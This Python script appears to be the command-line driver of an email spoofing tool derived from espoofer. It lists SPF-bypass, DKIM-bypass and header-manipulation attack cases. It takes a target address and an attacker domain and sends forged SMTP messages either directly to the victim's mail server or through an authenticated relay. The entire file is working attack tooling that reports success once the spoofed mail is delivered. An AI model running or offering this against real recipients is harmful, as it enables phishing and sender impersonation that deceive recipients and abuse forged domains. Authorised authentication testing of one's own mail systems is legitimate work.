#!/usr/bin/env python3

import sys
import argparse
from colorama import init
from typing import Dict, Any, Optional
import json
from common.common import get_date, id_generator
from common.mail_sender import MailSender
from exploits_builder import ExploitsBuilder
import testcases
import config

class EmailSpoofingTester:
    def __init__(self):
        self.config = config.config
        self.test_cases = testcases.test_cases
        
    def banner(self):
        print("""
╔═══╗     ╔╗         ╔═══╗                    ╔═══╗ 
║╔═╗║     ║║         ║╔═╗║                    ║╔═╗║ 
║╚═╝║╔══╗ ║║ ╔══╗    ║╚══╗╔══╗ ╔══╗ ╔══╗╔══╗ ║╚═╝║ 
║╔╗╔╝║╔╗║ ║║ ║══╣    ╚══╗║║╔╗║ ║╔╗║ ║╔╗║║╔╗║ ║╔══╝ 
║║║╚╗║╚╝║ ║╚╗╠══║    ║╚═╝║║╚╝║ ║╚╝║ ║╚╝║║╚╝║ ║║    
╚╝╚═╝╚══╝ ╚═╝╚══╝    ╚═══╝╚══╝ ║╔═╝ ╚══╝╚══╝ ╚╝    
                                ║║                    
                                ╚╝                    
Red Flag Spoofing - Advanced Email Authentication Testing Tool
        """)

    def list_attack_categories(self):
        """Display available attack categories"""
        categories = {
            "SPF Bypass": ["server_a1", "server_a2", "server_a5", "server_a6", "server_a7"],
            "DKIM Bypass": ["server_a3", "server_a4"],
            "Header Manipulation": ["server_a8", "server_a9", "server_a10", "server_a11"],
            "From Header Attacks": ["server_a12", "server_a13", "server_a14", "server_a15"],
            "Advanced Techniques": ["server_a16", "server_a17"],
            "Client Mode Attacks": [case for case in self.test_cases.keys() if case.startswith("client_")]
        }
        
        print("\nAvailable Attack Categories:")
        print("=" * 50)
        for category, cases in categories.items():
            print(f"\n{category}:")
            print("-" * len(category))
            for case in cases:
                desc = self.test_cases[case]["description"].decode('utf-8')
                print(f"  {case}: {desc}")

    def configure_attack(self, case_id: str, target_email: str, 
                        sender_domain: str, custom_body: Optional[str] = None) -> Dict[str, Any]:
        """Configure attack parameters for a specific test case"""
        if case_id not in self.test_cases:
            raise ValueError(f"Invalid case_id: {case_id}")
            
        config = self.config.copy()
        config["case_id"] = case_id.encode('utf-8')
        config["victim_address"] = target_email.encode('utf-8')
        config["attacker_site"] = sender_domain.encode('utf-8')
        
        if custom_body:
            config["body"] = custom_body.encode('utf-8')
            
        return config

    def execute_attack(self, case_id: str, target_email: str, 
                      sender_domain: str, mode: str = 's', 
                      custom_body: Optional[str] = None,
                      starttls: bool = False) -> bool:
        """Execute a specific attack case"""
        try:
            # Configure the attack
            attack_config = self.configure_attack(case_id, target_email, sender_domain, custom_body)
            
            # Set the mode
            attack_config['mode'] = mode
            
            # Create exploit builder
            exploits_builder = ExploitsBuilder(self.test_cases, attack_config)
            smtp_seqs = exploits_builder.generate_smtp_seqs()
            
            # Configure mail sender based on mode
            if mode == 's':  # Server mode
                mail_server = attack_config["server_mode"]['recv_mail_server']
                if not mail_server:
                    from common.common import get_mail_server_from_email_address
                    mail_server = get_mail_server_from_email_address(attack_config["victim_address"])
                port = attack_config["server_mode"]['recv_mail_server_port']
                
                mail_sender = MailSender()
                mail_sender.set_param(
                    (mail_server, port),
                    helo=smtp_seqs["helo"],
                    mail_from=smtp_seqs["mailfrom"],
                    rcpt_to=smtp_seqs["rcptto"],
                    email_data=smtp_seqs["msg_content"],
                    starttls=starttls
                )
                
            elif mode == 'c':  # Client mode
                mail_server = attack_config["client_mode"]["sending_server"]
                mail_sender = MailSender()
                mail_sender.set_param(
                    mail_server,
                    helo=b"espoofer-client.local",
                    mail_from=smtp_seqs["mailfrom"],
                    rcpt_to=smtp_seqs["rcptto"],
                    email_data=smtp_seqs["msg_content"],
                    starttls=True,
                    mode="client",
                    username=attack_config["client_mode"]['username'],
                    password=attack_config["client_mode"]['password']
                )
                
            # Execute the attack
            return mail_sender.send_email()
            
        except Exception as e:
            print(f"Error executing attack: {str(e)}")
            return False

def main():
    init()  # Initialize colorama
    tester = EmailSpoofingTester()
    
    parser = argparse.ArgumentParser(description="Red Flag Spoofing - Advanced Email Authentication Testing Tool")
    parser.add_argument("-l", "--list", action="store_true", help="List all available attack categories and cases")
    parser.add_argument("-m", "--mode", choices=['s', 'c'], default='s', help="Operation mode: server (s) or client (c)")
    parser.add_argument("-id", "--case-id", help="Specific test case ID to execute")
    parser.add_argument("-t", "--target", help="Target email address")
    parser.add_argument("-d", "--domain", help="Sender domain")
    parser.add_argument("-b", "--body", help="Custom email body")
    parser.add_argument("--tls", action="store_true", help="Enable STARTTLS")
    
    args = parser.parse_args()
    
    # Show banner
    tester.banner()
    
    if args.list:
        tester.list_attack_categories()
        return
        
    if not all([args.case_id, args.target, args.domain]):
        parser.error("--case-id, --target, and --domain are required unless --list is specified")
        
    print(f"\n[*] Executing attack case: {args.case_id}")
    print(f"[*] Target email: {args.target}")
    print(f"[*] Sender domain: {args.domain}")
    print(f"[*] Mode: {'Server' if args.mode == 's' else 'Client'}")
    
    success = tester.execute_attack(
        args.case_id,
        args.target,
        args.domain,
        args.mode,
        args.body,
        args.tls
    )
    
    if success:
        print("\n[+] Attack executed successfully!")
    else:
        print("\n[-] Attack execution failed!")

if __name__ == "__main__":
    main() 